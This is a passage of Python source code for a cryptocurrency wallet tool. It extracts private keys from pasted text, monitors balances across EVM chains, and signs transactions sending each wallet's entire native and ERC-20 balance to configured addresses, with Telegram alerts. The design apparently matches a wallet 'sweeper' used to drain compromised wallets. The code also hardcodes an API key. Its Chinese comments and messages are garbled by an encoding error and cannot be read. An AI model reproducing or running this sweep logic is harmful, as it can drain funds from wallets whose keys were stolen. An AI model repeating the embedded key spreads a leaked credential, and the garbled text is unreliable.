                        if metadata:
                            balance_raw = int(token['tokenBalance'], 16)
                            decimals = metadata.get('decimals', 18)
                            balance = balance_raw / (10 ** decimals)
                            
                            if balance > 0:
                                all_balances[contract_address] = {
                                    'symbol': metadata.get('symbol', 'UNKNOWN'),
                                    'balance': balance,
                                    'contract_address': contract_address,
                                    'decimals': decimals,
                                    'type': 'erc20'
                                }
            
            return all_balances
            
        except Exception as e:
            logging.error(f"Ëé∑ÂèñÂÖ®‰ª£Â∏Å‰ΩôÈ¢ùÂ§±Ë¥• {chain_config['name']}: {e}")
            # Â¶ÇÊûúAPIÂ§±Ë¥•ÔºåËá≥Â∞ëËøîÂõûÂéüÁîü‰ª£Â∏Å‰ΩôÈ¢ù
            native_balance = await self.get_balance(address, chain_config)
            if native_balance > 0:
                return {
                    'native': {
                        'symbol': chain_config['native_token'],
                        'balance': native_balance,
                        'contract_address': None,
                        'decimals': 18,
                        'type': 'native'
                    }
                }
            return {}
    
    async def get_token_metadata(self, contract_address: str, chain_config: Dict) -> Dict:
        """Ëé∑ÂèñERC-20‰ª£Â∏ÅÂÖÉÊï∞ÊçÆ"""
        await self._rate_limit()
        
        url = self._get_rpc_url(chain_config)
        
        payload = {
            "id": 1,
            "jsonrpc": "2.0",
            "method": "alchemy_getTokenMetadata",
            "params": [contract_address]
        }
        
        try:
            response = self.session.post(url, json=payload, timeout=10)
            response.raise_for_status()
            
            data = response.json()
            if 'result' in data:
                return data['result']
            
            return {}
        except Exception as e:
            logging.warning(f"Ëé∑Âèñ‰ª£Â∏ÅÂÖÉÊï∞ÊçÆÂ§±Ë¥• {contract_address}: {e}")
            return {}
    

    
    async def get_gas_price(self, chain_config: Dict) -> Dict:
        """Ëé∑ÂèñÂÆûÊó∂gas‰ª∑Ê†º"""
        await self._rate_limit()
        
        url = self._get_rpc_url(chain_config)
        
        # Â∞ùËØïËé∑ÂèñEIP-1559 gas‰ª∑Ê†º
        payload = {
            "id": 1,
            "jsonrpc": "2.0",
            "method": "eth_feeHistory",
            "params": ["0x1", "latest", [50]]  # Ëé∑ÂèñÊúÄËøë1‰∏™ÂùóÔºå50%ÂàÜ‰ΩçÊï∞
        }
        
        try:
            response = self.session.post(url, json=payload, timeout=10)
            response.raise_for_status()
            
            data = response.json()
            if 'result' in data:
                result = data['result']
                base_fee = int(result['baseFeePerGas'][0], 16)
                priority_fee = int(result['reward'][0][0], 16) if result['reward'] else 2000000000  # 2 gwei
                
                return {
                    "base_fee": base_fee,
                    "priority_fee": priority_fee,
                    "max_fee": base_fee + priority_fee,
                    "gas_price": base_fee + priority_fee
                }
        except:
            pass
        
        # ÂõûÈÄÄÂà∞‰º†Áªügas‰ª∑Ê†º
        payload = {
            "id": 1,
            "jsonrpc": "2.0",
            "method": "eth_gasPrice",
            "params": []
        }
        
        try:
            response = self.session.post(url, json=payload, timeout=10)
            response.raise_for_status()
            
            data = response.json()
            if 'result' in data:
                gas_price = int(data['result'], 16)
                return {
                    "gas_price": gas_price,
                    "max_fee": gas_price,
                    "base_fee": gas_price,
                    "priority_fee": 0
                }
        except Exception as e:
            logging.error(f"Ëé∑Âèñgas‰ª∑Ê†ºÂ§±Ë¥• {chain_config['name']}: {e}")
            
        # ÈªòËÆ§gas‰ª∑Ê†º
        return {
            "gas_price": 20000000000,  # 20 gwei
            "max_fee": 20000000000,
            "base_fee": 20000000000,
            "priority_fee": 0
        }

class TransferManager:
    """ËΩ¨Ë¥¶ÁÆ°ÁêÜÁ±ª"""
    
    def __init__(self, alchemy_api: AlchemyAPI, db_manager: DatabaseManager):
        self.alchemy_api = alchemy_api
        self.db_manager = db_manager
        self.web3_instances = {}
    
    def get_web3_instance(self, chain_config: Dict) -> Web3:
        """Ëé∑ÂèñWeb3ÂÆû‰æã"""
        chain_name = chain_config['name']
        
        if chain_name not in self.web3_instances:
            rpc_url = self.alchemy_api._get_rpc_url(chain_config)
            
            try:
                # ÂàõÂª∫HTTPÊèê‰æõËÄÖÔºåËÆæÁΩÆË∂ÖÊó∂
                provider = Web3.HTTPProvider(
                    rpc_url,
                    request_kwargs={'timeout': 30}
                )
                web3 = Web3(provider)
                
                # ‰∏∫Êüê‰∫õÈìæÊ∑ªÂä†POA‰∏≠Èó¥‰ª∂
                if chain_config['chain_id'] in [56, 137, 250, 43114]:  # BSC, Polygon, Fantom, Avalanche
                    try:
                        # Â∞ùËØïÊñ∞ÁâàÊú¨ÁöÑ‰∏≠Èó¥‰ª∂Ê≥®ÂÖ•ÊñπÂºè
                        if callable(geth_poa_middleware):
                            if hasattr(web3.middleware_onion, 'inject'):
                                web3.middleware_onion.inject(geth_poa_middleware, layer=0)
                            else:
                                # ÂÖºÂÆπÊõ¥Êñ∞ÁöÑÁâàÊú¨
                                web3.middleware_onion.add(geth_poa_middleware)
                    except Exception as e:
                        logging.debug(f"POA‰∏≠Èó¥‰ª∂Ê≥®ÂÖ•Â§±Ë¥•: {e}")
                        # ÁªßÁª≠ÊâßË°åÔºå‰∏çÂΩ±Âìç‰∏ªË¶ÅÂäüËÉΩ
                
                # ÊµãËØïËøûÊé•
                try:
                    web3.is_connected()
                except Exception as e:
                    logging.debug(f"Web3ËøûÊé•ÊµãËØïÂ§±Ë¥• {chain_name}: {e}")
                
                self.web3_instances[chain_name] = web3
                
            except Exception as e:
                logging.error(f"ÂàõÂª∫Web3ÂÆû‰æãÂ§±Ë¥• {chain_name}: {e}")
                # ÂàõÂª∫‰∏Ä‰∏™Âü∫Êú¨ÁöÑWeb3ÂÆû‰æã‰Ωú‰∏∫ÂêéÂ§á
                web3 = Web3(Web3.HTTPProvider(rpc_url))
                self.web3_instances[chain_name] = web3
        
        return self.web3_instances[chain_name]
    
    async def estimate_smart_gas(self, from_address: str, to_address: str, 
                                balance_wei: int, chain_config: Dict, 
                                is_erc20: bool = False) -> Tuple[int, int, int]:
        """Êô∫ËÉΩgas‰º∞ÁÆó - Á°Æ‰øùÂ∞ëÈáè‰ΩôÈ¢ù‰πüËÉΩËΩ¨Ë¥¶"""
        web3 = self.get_web3_instance(chain_config)
        
        try:
            # Ëé∑Âèñgas‰ª∑Ê†º
            gas_data = await self.alchemy_api.get_gas_price(chain_config)
            
            # Ê†πÊçÆ‰ª£Â∏ÅÁ±ªÂûãËÆæÁΩÆgas limit
            if is_erc20:
                base_gas_limit = 65000  # ERC-20ËΩ¨Ë¥¶Âü∫Á°Ägas
            else:
                base_gas_limit = 21000  # ÂéüÁîü‰ª£Â∏ÅËΩ¨Ë¥¶Âü∫Á°Ägas
            
            # Êô∫ËÉΩgas‰ª∑Ê†ºË∞ÉÊï¥
            if chain_config['chain_id'] in [1, 42161, 10]:  # ‰∏ªÁΩë„ÄÅArbitrum„ÄÅOptimism
                # È´ò‰ª∑ÂÄºÈìæÔºå‰ΩøÁî®ËæÉ‰Ωégas‰ª∑Ê†º
                gas_price = int(gas_data['gas_price'] * 0.8)
            elif chain_config['chain_id'] in [137, 56, 43114]:  # Polygon„ÄÅBSC„ÄÅAvalanche
                # ‰∏≠Á≠â‰ª∑ÂÄºÈìæÔºå‰ΩøÁî®Ê†áÂáÜgas‰ª∑Ê†º
                gas_price = gas_data['gas_price']
            else:
                # ÂÖ∂‰ªñÈìæÔºå‰ΩøÁî®ËæÉÈ´ògas‰ª∑Ê†ºÁ°Æ‰øùÊàêÂäü
                gas_price = int(gas_data['gas_price'] * 1.2)
            
            # ËÆ°ÁÆógasÊàêÊú¨
            total_gas_cost = base_gas_limit * gas_price
            
            # Êô∫ËÉΩ‰ΩôÈ¢ùÂàÜÈÖçÔºö‰∏∫ÂéüÁîü‰ª£Â∏ÅÈ¢ÑÁïôgasË¥πÁî®
            if not is_erc20:
                # ÂéüÁîü‰ª£Â∏ÅÈúÄË¶ÅÈ¢ÑÁïôgasË¥πÁî®
                available_amount = max(0, balance_wei - total_gas_cost)
                if available_amount <= 0:
                    print_warning(f"‰ΩôÈ¢ù‰∏çË∂≥ÊîØ‰ªògasË¥πÁî® {chain_config['name']}")
                    return 0, 0, 0
            else:
                # ERC-20‰ª£Â∏Å‰ΩøÁî®ÂÖ®ÈÉ®‰ΩôÈ¢ù
                available_amount = balance_wei
            
            print_gas(f"‚õΩ Gas‰º∞ÁÆó {chain_config['name']}: {base_gas_limit} gas * {gas_price/1e9:.2f} gwei = {total_gas_cost/1e18:.6f} {chain_config['native_token']}")
            
            return base_gas_limit, gas_price, available_amount
            
        except Exception as e:
            print_error(f"Gas‰º∞ÁÆóÂ§±Ë¥• {chain_config['name']}: {e}")
            # ËøîÂõû‰øùÂÆàÁöÑÈªòËÆ§ÂÄº
            return 21000, 20000000000, max(0, balance_wei - 21000 * 20000000000)
    
    async def send_native_transaction(self, private_key: str, from_address: str, 
                                     to_address: str, amount: float, chain_config: Dict,
                                     max_retries: int = 3) -> Dict:
        """ÂèëÈÄÅÂéüÁîü‰ª£Â∏Å‰∫§Êòì"""
        web3 = self.get_web3_instance(chain_config)
        account = Account.from_key(private_key)
        
        for retry in range(max_retries):
            try:
                # Ëé∑Âèñnonce
                nonce = web3.eth.get_transaction_count(from_address)
                
                # ËΩ¨Êç¢ÈáëÈ¢ù‰∏∫wei
                amount_wei = Web3.to_wei(amount, 'ether')
                
                # Êô∫ËÉΩgas‰º∞ÁÆó
                balance_wei = web3.eth.get_balance(from_address)
                gas_limit, gas_price, available_amount = await self.estimate_smart_gas(
                    from_address, to_address, balance_wei, chain_config, False
                )
                
                # Ê£ÄÊü•Êô∫ËÉΩgas‰º∞ÁÆóÁªìÊûú
                if available_amount <= 0:
                    logging.warning(f"‰ΩôÈ¢ù‰∏çË∂≥‰ª•ÊîØ‰ªògasË¥πÁî® {chain_config['name']}: ‰ΩôÈ¢ù {balance_wei/1e18:.9f}, gasË¥πÁî® {(gas_limit * gas_price)/1e18:.9f}")
                    print_warning(f"ÂèñÊ∂àÈáçËØï {chain_config['name']}: ‰ΩôÈ¢ù‰∏çË∂≥‰ª•ÊîØ‰ªògasË¥πÁî®")
                    return {
                        "success": False,
                        "error": f"‰ΩôÈ¢ù‰∏çË∂≥‰ª•ÊîØ‰ªògasË¥πÁî®: ‰ΩôÈ¢ù {balance_wei} wei, ÈúÄË¶Å {gas_limit * gas_price} wei",
                        "type": "native",
                        "skip_retry": True  # Ê†áËÆ∞Ë∑≥ËøáÈáçËØï
                    }
                
                # ‰ΩøÁî®Êô∫ËÉΩËÆ°ÁÆóÁöÑÂèØÁî®ÈáëÈ¢ù
                amount_wei = available_amount
                
                # ÊûÑÂª∫‰∫§ÊòìÔºà‰ΩøÁî®Êô∫ËÉΩgas‰ª∑Ê†ºÔºâ
                transaction = {
                    'nonce': nonce,
                    'to': Web3.to_checksum_address(to_address),
                    'value': amount_wei,
                    'gas': gas_limit,
                    'gasPrice': gas_price,
                    'chainId': chain_config['chain_id']
                }
                
                # Á≠æÂêç‰∫§Êòì
                signed_txn = account.sign_transaction(transaction)
                
                # ÂèëÈÄÅ‰∫§Êòì
                tx_hash = web3.eth.send_raw_transaction(signed_txn.rawTransaction)
                tx_hash_hex = tx_hash.hex()
                
                # Á≠âÂæÖ‰∫§ÊòìÁ°ÆËÆ§
                receipt = web3.eth.wait_for_transaction_receipt(tx_hash, timeout=300)
                
                # ËÆ∞ÂΩïÊàêÂäüÁöÑËΩ¨Ë¥¶
                await self.db_manager.log_transfer(
                    from_address, chain_config['name'], chain_config['chain_id'],
                    str(Web3.from_wei(amount_wei, 'ether')), to_address,
                    tx_hash_hex, str(receipt.gasUsed), str(gas_price),
                    "success"
                )
                
                return {
                    "success": True,
                    "tx_hash": tx_hash_hex,
                    "amount": Web3.from_wei(amount_wei, 'ether'),
                    "gas_used": receipt.gasUsed,
                    "gas_price": gas_price,
                    "type": "native"
                }
                
            except Exception as e:
                error_msg = str(e)
                logging.error(f"ÂéüÁîü‰ª£Â∏ÅËΩ¨Ë¥¶Â§±Ë¥• (ÈáçËØï {retry + 1}/{max_retries}) {chain_config['name']}: {error_msg}")
                
                # Ê£ÄÊü•ÊòØÂê¶ÊòØ‰ΩôÈ¢ù‰∏çË∂≥ÈîôËØØÔºåÂ¶ÇÊûúÊòØÂàôÁõ¥Êé•Ë∑≥Âá∫ÈáçËØï
                if "insufficient funds" in error_msg.lower() or "‰ΩôÈ¢ù‰∏çË∂≥" in error_msg:
                    translated_error = translate_error_message(error_msg)
                    print_error(f"‚ùå NATIVEËΩ¨Ë¥¶Â§±Ë¥•: {translated_error}")
                    print_warning(f"ÂèñÊ∂àÈáçËØï {chain_config['name']}: ‰ΩôÈ¢ù‰∏çË∂≥")
                    await self.db_manager.log_transfer(
                        from_address, chain_config['name'], chain_config['chain_id'],
                        str(amount), to_address, status="failed", error_message=error_msg
                    )
                    return {
                        "success": False,
                        "error": error_msg,
                        "type": "native"
                    }
                
                if retry == max_retries - 1:
                    # ËÆ∞ÂΩïÂ§±Ë¥•ÁöÑËΩ¨Ë¥¶
                    await self.db_manager.log_transfer(
                        from_address, chain_config['name'], chain_config['chain_id'],
                        str(amount), to_address, status="failed", error_message=error_msg
                    )
                    
                    return {
                        "success": False,
                        "error": error_msg,
                        "retry_count": max_retries,
                        "type": "native"
                    }
                
                # Á≠âÂæÖ5ÁßíÂêéÈáçËØï
                await asyncio.sleep(5)
        
        return {"success": False, "error": "ËææÂà∞ÊúÄÂ§ßÈáçËØïÊ¨°Êï∞", "type": "native"}
    
    async def send_erc20_transaction(self, private_key: str, from_address: str, 
                                   to_address: str, token_info: Dict, chain_config: Dict,
                                   max_retries: int = 3) -> Dict:
        """ÂèëÈÄÅERC-20‰ª£Â∏Å‰∫§Êòì"""
        web3 = self.get_web3_instance(chain_config)
        account = Account.from_key(private_key)
        
        # ERC-20 ABI‰∏≠ÁöÑtransferÂáΩÊï∞
        erc20_abi = [
            {
                "constant": False,
                "inputs": [
                    {"name": "_to", "type": "address"},
                    {"name": "_value", "type": "uint256"}
                ],
                "name": "transfer",
                "outputs": [{"name": "", "type": "bool"}],
                "type": "function"
            }
        ]
        
        for retry in range(max_retries):
            try:
                # Ëé∑Âèñnonce
                nonce = web3.eth.get_transaction_count(from_address)
                
                # ÂàõÂª∫ÂêàÁ∫¶ÂÆû‰æã
                contract = web3.eth.contract(
                    address=Web3.to_checksum_address(token_info['contract_address']),
                    abi=erc20_abi
                )
                
                # ËÆ°ÁÆóËΩ¨Ë¥¶ÈáëÈ¢ùÔºàËΩ¨Âá∫ÊâÄÊúâ‰ΩôÈ¢ùÔºâ
                amount_raw = int(token_info['balance'] * (10 ** token_info['decimals']))
                
                # ÊûÑÂª∫‰∫§ÊòìÊï∞ÊçÆ
                try:
                    transaction_data = contract.functions.transfer(
                        Web3.to_checksum_address(to_address),
                        amount_raw
                    ).build_transaction({
                        'chainId': chain_config['chain_id'],
                        'gas': 100000,  # ERC-20ËΩ¨Ë¥¶ÁöÑgas limit
                        'nonce': nonce,
                    })
                except AttributeError:
                    # ÂÖºÂÆπ‰∏çÂêåÁâàÊú¨ÁöÑWeb3
                    transaction_data = contract.functions.transfer(
                        Web3.to_checksum_address(to_address),
                        amount_raw
                    ).buildTransaction({
                        'chainId': chain_config['chain_id'],
                        'gas': 100000,
                        'nonce': nonce,
                    })
                
                # Ê£ÄÊü•ÂéüÁîü‰ª£Â∏Å‰ΩôÈ¢ùÊòØÂê¶Ë∂≥Â§üÊîØ‰ªògas
                native_balance = web3.eth.get_balance(from_address)
                
                # Ëé∑Âèñgas‰ª∑Ê†º
                gas_data = await self.alchemy_api.get_gas_price(chain_config)
                
                # ËÆ°ÁÆógasË¥πÁî®
                estimated_gas_cost = transaction_data['gas'] * gas_data['gas_price']
                
                if native_balance < estimated_gas_cost:
                    raise ValueError(f"ÂéüÁîü‰ª£Â∏Å‰ΩôÈ¢ù‰∏çË∂≥ÊîØ‰ªògasË¥πÁî®: ÈúÄË¶Å {estimated_gas_cost/1e18:.8f} {chain_config['native_token']}, ‰ΩôÈ¢ù {native_balance/1e18:.8f}")
                
                # Ê†πÊçÆÈìæÊîØÊåÅÊÉÖÂÜµËÆæÁΩÆgas‰ª∑Ê†º
                if 'max_fee' in gas_data and chain_config['chain_id'] in [1, 137, 10, 42161]:
                    transaction_data.update({
                        'maxFeePerGas': gas_data['max_fee'],
                        'maxPriorityFeePerGas': gas_data['priority_fee']
                    })
                else:
                    transaction_data['gasPrice'] = gas_data['gas_price']
                
                # Á≠æÂêç‰∫§Êòì
                signed_txn = account.sign_transaction(transaction_data)
                
                # ÂèëÈÄÅ‰∫§Êòì
                tx_hash = web3.eth.send_raw_transaction(signed_txn.rawTransaction)
                tx_hash_hex = tx_hash.hex()
                
                # Á≠âÂæÖ‰∫§ÊòìÁ°ÆËÆ§
                receipt = web3.eth.wait_for_transaction_receipt(tx_hash, timeout=300)
                
                # ËÆ∞ÂΩïÊàêÂäüÁöÑËΩ¨Ë¥¶
                await self.db_manager.log_transfer(
                    from_address, chain_config['name'], chain_config['chain_id'],
                    f"{token_info['balance']} {token_info['symbol']}", to_address,
                    tx_hash_hex, str(receipt.gasUsed), str(gas_data['gas_price']),
                    "success"
                )
                
                return {
                    "success": True,
                    "tx_hash": tx_hash_hex,
                    "amount": token_info['balance'],
                    "symbol": token_info['symbol'],
                    "gas_used": receipt.gasUsed,
                    "gas_price": gas_data['gas_price'],
                    "type": "erc20"
                }
                
            except Exception as e:
                error_msg = str(e)
                logging.error(f"ERC-20ËΩ¨Ë¥¶Â§±Ë¥• (ÈáçËØï {retry + 1}/{max_retries}) {token_info['symbol']}: {error_msg}")
                
                # Ê£ÄÊü•ÊòØÂê¶ÊòØ‰ΩôÈ¢ù‰∏çË∂≥ÈîôËØØÔºåÂ¶ÇÊûúÊòØÂàôÁõ¥Êé•Ë∑≥Âá∫ÈáçËØï
                if "insufficient funds" in error_msg.lower() or "‰ΩôÈ¢ù‰∏çË∂≥" in error_msg:
                    translated_error = translate_error_message(error_msg)
                    print_error(f"‚ùå ERC20ËΩ¨Ë¥¶Â§±Ë¥•: {translated_error}")
                    print_warning(f"ÂèñÊ∂àÈáçËØï: ÂéüÁîü‰ª£Â∏Å‰ΩôÈ¢ù‰∏çË∂≥ÊîØ‰ªògasË¥πÁî®")
                    await self.db_manager.log_transfer(
                        from_address, chain_config['name'], chain_config['chain_id'],
                        f"{token_info['balance']} {token_info['symbol']}", to_address, 
                        status="failed", error_message=error_msg
                    )
                    return {
                        "success": False,
                        "error": error_msg,
                        "type": "erc20",
                        "symbol": token_info['symbol']
                    }
                
                if retry == max_retries - 1:
                    # ËÆ∞ÂΩïÂ§±Ë¥•ÁöÑËΩ¨Ë¥¶
                    await self.db_manager.log_transfer(
                        from_address, chain_config['name'], chain_config['chain_id'],
                        f"{token_info['balance']} {token_info['symbol']}", to_address, 
                        status="failed", error_message=error_msg
                    )
                    
                    return {
                        "success": False,
                        "error": error_msg,
                        "retry_count": max_retries,
                        "type": "erc20",
                        "symbol": token_info['symbol']
                    }
                
                # Á≠âÂæÖ5ÁßíÂêéÈáçËØï
                await asyncio.sleep(5)
        
        return {"success": False, "error": "ËææÂà∞ÊúÄÂ§ßÈáçËØïÊ¨°Êï∞", "type": "erc20"}
    


class MonitoringApp:
    """‰∏ªÁõëÊéßÂ∫îÁî®Á±ª"""
    
    def __init__(self):
        self.alchemy_api = None
        self.db_manager = DatabaseManager()
        self.transfer_manager = None
        self.addresses = []
        self.config = {}
        self.monitoring_active = False
        self.blocked_chains_cache = set()  # ÁºìÂ≠òÂ∑≤Â±èËîΩÁöÑÈìæÔºåÈÅøÂÖçÈáçÂ§çÊï∞ÊçÆÂ∫ìÊü•ËØ¢
        self.db_semaphore = asyncio.Semaphore(5)  # ÈôêÂà∂Âπ∂ÂèëÊï∞ÊçÆÂ∫ìÊìç‰Ωú
        self.setup_logging()
    
    def setup_logging(self):
        """ËÆæÁΩÆÊó•Âøó"""
        os.makedirs("logs", exist_ok=True)
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('logs/transactions.log', encoding='utf-8'),
                logging.StreamHandler()
            ]
        )
    
    def extract_private_keys(self, private_keys_input: str) -> List[str]:
        """‰ªéËæìÂÖ•ÊñáÊú¨‰∏≠ÊèêÂèñÁßÅÈí•
        ÊîØÊåÅ 0x ÂâçÁºÄ‰∏é‰∏çÂ∏¶ÂâçÁºÄÁöÑ64‰ΩçÂçÅÂÖ≠ËøõÂà∂ÔºåÂéªÈáçÂπ∂È™åËØÅÊúâÊïàÊÄß
        """
        if not private_keys_input or not private_keys_input.strip():
            return []
            
        # Ê∏ÖÁêÜËæìÂÖ•ÔºöÁßªÈô§Â§ö‰ΩôÁ©∫Ê†º„ÄÅÊç¢Ë°åÁ¨¶„ÄÅÂà∂Ë°®Á¨¶
        cleaned_input = re.sub(r'\s+', ' ', private_keys_input.strip())
        
        # ÂêåÊó∂ÂåπÈÖç 0x ÂâçÁºÄÂíåÊó†ÂâçÁºÄÁöÑÁßÅÈí•ÁâáÊÆµ
        private_key_pattern = r'(?:0x)?[a-fA-F0-9]{64}'
        matches = re.findall(private_key_pattern, cleaned_input)

        if not matches:
            logging.warning("Êú™ÊâæÂà∞Á¨¶ÂêàÊ†ºÂºèÁöÑÁßÅÈí•")
            return []

        normalized_keys: List[str] = []
        for key in matches:
            # Áªü‰∏Ä‰∏∫0xÂâçÁºÄÂ∞èÂÜôÊ†ºÂºè
            key_clean = key.lower()
            if not key_clean.startswith('0x'):
                key_clean = '0x' + key_clean
            normalized_keys.append(key_clean)

        # ÂéªÈáç‰∏î‰øùÊåÅÈ°∫Â∫è
        seen = set()
        unique_keys = []
        for key in normalized_keys:
            if key not in seen:
                seen.add(key)
                unique_keys.append(key)

        valid_keys: List[str] = []
        for key in unique_keys:
            try:
                # È™åËØÅÁßÅÈí•ÊúâÊïàÊÄß
                account = Account.from_key(key)
                valid_keys.append(key)
                logging.info(f"ÊèêÂèñÂà∞ÊúâÊïàÁßÅÈí•ÔºåÂØπÂ∫îÂú∞ÂùÄ: {account.address}")
            except Exception as e:
                logging.warning(f"Êó†ÊïàÁßÅÈí• {key[:10]}...: {e}")

        return valid_keys
    
    async def initialize(self):
        """ÂàùÂßãÂåñÂ∫îÁî®"""
        print_progress("ÂàùÂßãÂåñÊï∞ÊçÆÂ∫ì...")
        await self.db_manager.init_database()
        
        print_progress("Âä†ËΩΩÈÖçÁΩÆ...")
        await self.load_config()
        
        print_progress("Â∞ùËØï‰ªéÊï∞ÊçÆÂ∫ìÂä†ËΩΩÁßÅÈí•...")
        if await self.load_private_keys_from_db():
            print_success("Â∑≤Ëá™Âä®Âä†ËΩΩ‰øùÂ≠òÁöÑÁßÅÈí•")
        else:
            print_info("Êú™ÊâæÂà∞‰øùÂ≠òÁöÑÁßÅÈí•ÔºåÈúÄË¶ÅÊâãÂä®ÂØºÂÖ•")
        
        # ‰ΩøÁî®Âõ∫ÂÆöÁöÑAPIÂØÜÈí•
        api_key = "MYr2ZG1P7bxc4F1qVTLIj"
        print_info(f"‰ΩøÁî®APIÂØÜÈí•: {api_key[:8]}...")
        
        self.alchemy_api = AlchemyAPI(api_key)
        self.transfer_manager = TransferManager(self.alchemy_api, self.db_manager)
        
        print_success("ÂàùÂßãÂåñÂÆåÊàê")
    
    async def load_config(self):
        """Âä†ËΩΩÈÖçÁΩÆÊñá‰ª∂"""
        try:
            with open('config.json', 'r', encoding='utf-8') as f:
                self.config = json.load(f)
        except FileNotFoundError:
            # ÂàõÂª∫ÈªòËÆ§ÈÖçÁΩÆ
            self.config = {
                "chains": [
                    {
                        "name": "ETH_MAINNET",
                        "chain_id": 1,
                        "recipient_address": "0x0000000000000000000000000000000000000000",
                        "min_amount": "0.01"
                    }
                ],
                "erc20": [],
                "settings": {
                    "monitoring_interval": 0.01,
                    "round_pause": 5,
                    "gas_threshold_gwei": 50,
                    "gas_wait_time": 60
                }
            }
            await self.save_config()
    
    async def save_config(self):
        """‰øùÂ≠òÈÖçÁΩÆÊñá‰ª∂"""
        with open('config.json', 'w', encoding='utf-8') as f:
            json.dump(self.config, f, indent=2, ensure_ascii=False)
    
    async def check_chain_history(self, address: str, chain_config: Dict) -> bool:
        """Ê£ÄÊü•ÈìæÊòØÂê¶Êúâ‰∫§ÊòìÂéÜÂè≤"""
        # È¶ñÂÖàÊ£ÄÊü•Êï∞ÊçÆÂ∫ì‰∏≠ÊòØÂê¶Â∑≤ÁªèÂ±èËîΩ
        if await self.db_manager.is_chain_blocked(address, chain_config['chain_id']):
            return False
        
        # Ê£ÄÊü•‰∫§ÊòìÂéÜÂè≤
        has_history, transfer_count = await self.alchemy_api.check_asset_transfers(address, chain_config)
        
        if not has_history:
            # Â±èËîΩÊó†‰∫§ÊòìÂéÜÂè≤ÁöÑÈìæ
            await self.db_manager.block_chain(
                address, chain_config['name'], chain_config['chain_id']
            )
            logging.debug(f"Â±èËîΩÈìæ {chain_config['name']} (Âú∞ÂùÄ: {address}): Êó†‰∫§ÊòìÂéÜÂè≤Êàñ‰∏çÂèØÁî®")
        
        return has_history
    

    
    async def send_telegram_notification(self, message: str):
        """ÂèëÈÄÅTelegramÈÄöÁü•"""
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message,
                "parse_mode": "HTML"
            }
            
            response = requests.post(url, json=payload, timeout=10)
            response.raise_for_status()
            print_success("TelegramÈÄöÁü•ÂèëÈÄÅÊàêÂäü")
            
        except Exception as e:
            print_error(f"TelegramÈÄöÁü•ÂèëÈÄÅÂ§±Ë¥•: {e}")
            logging.error(f"TelegramÈÄöÁü•ÂèëÈÄÅÂ§±Ë¥•: {e}")
    
    async def start_monitoring(self):
        """ÂºÄÂßãÁõëÊéß - ÈáçÊûÑÂêéÁöÑÈÄªËæë"""
        # È™åËØÅÂâçÁΩÆÊù°‰ª∂
        if not self.addresses:
            print_error("Ê≤°ÊúâÂèØÁõëÊéßÁöÑÂú∞ÂùÄÔºåËØ∑ÂÖàÂØºÂÖ•ÁßÅÈí•")
            return
        
        if not self.config.get('chains'):
            print_error("Ê≤°ÊúâÈÖçÁΩÆÁõëÊéßÈìæÔºåËØ∑ÈáçÊñ∞ÂØºÂÖ•ÁßÅÈí•")
            return
            
        if not self.alchemy_api:
            print_error("APIÊú™ÂàùÂßãÂåñ")
            return
        
        print_success(f"ÂºÄÂßãÁõëÊéß {len(self.addresses)} ‰∏™Âú∞ÂùÄ")
        print_info("Êåâ Ctrl+C ÂÅúÊ≠¢ÁõëÊéß")
        
        self.monitoring_active = True
        
        try:
            # Á¨¨‰∏ÄÊ≠•ÔºöÂàùÂßãÂåñRPCËøûÊé•Âπ∂Â±èËîΩÊó†ÊïàÈìæ
            print_progress("Á¨¨‰∏ÄÊ≠•ÔºöÂàùÂßãÂåñRPCËøûÊé•Âπ∂Â±èËîΩÊó†ÊïàÈìæ")
            await self.initialize_rpc_connections()
            
            # Á¨¨‰∫åÊ≠•ÔºöÊâ´Êèè‰∫§ÊòìËÆ∞ÂΩïÂπ∂Â±èËîΩÊó†‰∫§ÊòìËÆ∞ÂΩïÁöÑÈìæ
            print_progress("Á¨¨‰∫åÊ≠•ÔºöÊâ´ÊèèÈìæ‰∏ä‰∫§ÊòìËÆ∞ÂΩï")
            await self.scan_transaction_history()
            
            # Á¨¨‰∏âÊ≠•ÔºöÂºÄÂßãÁõëÊéßÂæ™ÁéØ
            print_progress("Á¨¨‰∏âÊ≠•ÔºöÂºÄÂßã‰ΩôÈ¢ùÁõëÊéßÂíåËΩ¨Ë¥¶")
            await self.monitoring_loop()
                
        except KeyboardInterrupt:
            print_warning("ÁõëÊéßË¢´Áî®Êà∑‰∏≠Êñ≠")
        except Exception as e:
            print_error(f"ÁõëÊéßËøáÁ®ã‰∏≠Âá∫Èîô: {e}")
            logging.error(f"ÁõëÊéßËøáÁ®ã‰∏≠Âá∫Èîô: {e}")
        finally:
            self.monitoring_active = False
            print_info("ÁõëÊéßÂ∑≤ÂÅúÊ≠¢")
    
    async def initialize_rpc_connections(self):
        """Á¨¨‰∏ÄÊ≠•ÔºöÂàùÂßãÂåñRPCËøûÊé•Âπ∂Â±èËîΩÊó†ÊïàÈìæ"""
        print_chain("üåê ÂàùÂßãÂåñRPCËøûÊé•...")
        
        valid_chains = []
        invalid_chains = []
        
        for chain_setting in self.config['chains']:
            chain_config = None
            for chain_name, supported_config in ChainConfig.SUPPORTED_CHAINS.items():
                if supported_config['chain_id'] == chain_setting['chain_id']:
                    chain_config = supported_config
                    break
            
            if not chain_config:
                invalid_chains.append(chain_setting['name'])
                continue
                
            print_rpc(f"ÊµãËØïËøûÊé•: {chain_config['name']}")
            
            try:
                # ÊµãËØïRPCËøûÊé•
                web3 = self.transfer_manager.get_web3_instance(chain_config)
                if web3.is_connected():
                    valid_chains.append(chain_config['name'])
                    print_success(f"RPCËøûÊé•ÊàêÂäü: {chain_config['name']}")
                else:
                    invalid_chains.append(chain_config['name'])
                    print_error(f"RPCËøûÊé•Â§±Ë¥•: {chain_config['name']}")
            except Exception as e:
                invalid_chains.append(chain_config['name'])
                print_error(f"RPCËøûÊé•ÂºÇÂ∏∏ {chain_config['name']}: {e}")
        
        print_info(f"RPCËøûÊé•ÁªìÊûú: {len(valid_chains)} ÊàêÂäü, {len(invalid_chains)} Â§±Ë¥•")
        if invalid_chains:
            print_warning(f"Êó†ÊïàÈìæ: {', '.join(invalid_chains)}")
    
    async def scan_transaction_history(self):
        """Á¨¨‰∫åÊ≠•ÔºöÊâ´Êèè‰∫§ÊòìËÆ∞ÂΩïÂπ∂Â±èËîΩÊó†‰∫§ÊòìËÆ∞ÂΩïÁöÑÈìæ"""
